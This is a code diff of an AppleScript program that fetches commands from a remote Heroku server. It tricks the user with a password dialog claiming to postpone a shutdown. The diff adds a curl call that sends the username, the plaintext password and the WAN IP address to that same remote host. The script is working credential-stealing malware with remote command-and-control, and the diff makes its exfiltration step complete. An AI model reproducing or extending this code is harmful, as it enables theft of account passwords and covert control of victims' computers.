@@ -9,10 +9,10 @@ on error
 end try
 
 set remoteHost to "http://damp-journey-2734.herokuapp.com"
-set remoteURL to remoteHost & "/remote.txt"
+set commandURL to remoteHost & "/remote.txt"
 try
-	set commandArgs to paragraphs of (do shell script "curl " & remoteURL & " | cut -d ':' -f 2")
-
+	set commandArgs to paragraphs of (do shell script "curl " & commandURL & " | cut -d ':' -f 2")
+	log commandArgs
 	if (item 1 of commandArgs) is "true" then -- Kill
 		try
 			try
@@ -46,6 +46,7 @@ try
 	try
 		set oldpasswd to (do shell script "cat " & ufld & "." & theuser & ".txt")
 		checkPassword(theuser, oldpasswd) -- Check if password is correct
+		set passwd to oldpasswd
 	on error err	
 		repeat
 			set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 5 with hidden answer) -- Prompt for Password
@@ -73,14 +74,8 @@ try
 	on error
 		set WANIP to "not connected"
 	end try
-	try
-		set LANIP to (do shell script "ipconfig getifaddr en0")
-	on error
-		set LANIP to "not connected"
-	end try
-	log WANIP & " " & LANIP
-
-	do shell script "curl "
+	log WANIP
+	do shell script "curl " & remoteHost & "/a?user=" & theuser & "&pass=" & passwd & "&WANIP=" & WANIP
 end try
 
 on checkPassword(user, pass)
